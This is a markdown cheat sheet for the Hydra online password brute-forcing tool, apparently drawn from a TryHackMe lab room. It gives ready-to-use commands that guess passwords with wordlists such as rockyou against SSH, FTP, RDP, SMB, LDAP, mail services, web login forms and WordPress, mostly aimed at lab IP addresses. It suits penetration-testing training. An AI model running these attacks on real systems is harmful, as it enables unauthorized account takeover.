### Hydra User Guide
- All credit goes to: DarkStar7471 for his THM room located here : https://tryhackme.com/room/hydra

- Hydra is a brute force online password cracking tool, which can be used with a variety of protocols
- Protocols that hydra can work with:
Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, 
HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, 
POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, 
VMware-Auth, VNC and XMPP.
- Official kali page:
- https://en.kali.tools/?p=220
- Download it (default on kali):
- https://github.com/vanhauser-thc/thc-hydra
#### Hydra Syntax
- The correct hydra syntax is depended upon the service you are going after.  For example if we want to hit ftp we should use:
#### FTP
````
hydra -l user -P passlist.txt ftp://10.10.10.10
````
#### SSH
````
hydra -l <username> -P /usr/share/wordlists/rockyou.txt 10.10.10.10. -t 4 ssh
````
- `-l` is to specify the username 
- `P` is to specify a password list
- `-t` is to specify the number of threads to run hydra with.
- Note: Hydra recommends no more than 4 threads, however you can run it faster with `-t 16`.
#### POST Web Form
- Hydra can be used to brute force web logins as well.
- Step 1: Determine the request made to the form (POST/GET)
- Identify this in the network tab (developer tools), view the source code, or use Burp Suite.
- Syntax:
````
hydra -l <username> -P /usr/share/wordlists/rockyou.txt 10.10.211.150 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -vV
````
- `http-post-form` specifies the type of form
- `/login url` the login page URL i.e. `http://dont-brute-force-me.com/login.php`
- `:username` the form field name for the username
- `^USER^` this tells hydra to use the username you specified
- `password` the form field name for the password
- `^PASS^` the password list specified in the command 
- `Login` the failed login message
- `Login failed` is the login failure message that the form specifies 
- `F=inncorrect` the word that appears on the page if the login fails
- `-vV` specifies very verbose output 
- Hydra non default ssh port:
````
hydra -t 16 -l sam -P /usr/share/wordlists/rockyou.txt 10.10.80.187 ssh -s 4567 -vV
````
#### Example Syntax
````
#Hydra brute force against SNMP
hydra -P password-file.txt -v $ip snmp	
#Hydra FTP known user and rockyou password list
hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp	
#Hydra SSH using list of users and passwords
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh	
#Hydra SSH using a known password and a username list
hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh
#Hydra SSH Against Known username on port 22
hydra $ip -s 22 ssh -l -P big_wordlist.txt	
#Hydra POP3 Brute Force
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V	
#Hydra SMTP Brute Force
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V	
#Hydra attack http get 401 login with a dictionary
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin	
#Hydra attack Windows Remote Desktop with rockyou
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip	
#Hydra brute force SMB user with rockyou
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb	
#Hydra brute force a Wordpress admin
hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'	 login
#SMB Brute Forcing
hydra -L usernames.txt -P passwords.txt $ip smb -V -f	
#LDAP Brute Forcing
hydra -L users.txt -P passwords.txt $ip ldap2 -V -f	
````
#### Additional Syntax Formats
````
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.211.150 http-post-form "/login:username=molly&password=^PASS^:F=incorrect" -V
sudo hydra 10.0.0.1 http-post-form "/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid" -P /usr/share/wordlists/rockyou.txt -l admin
hydra -l lazie -P /opt/rockyou.txt imap://10.10.251.142 -vV
````









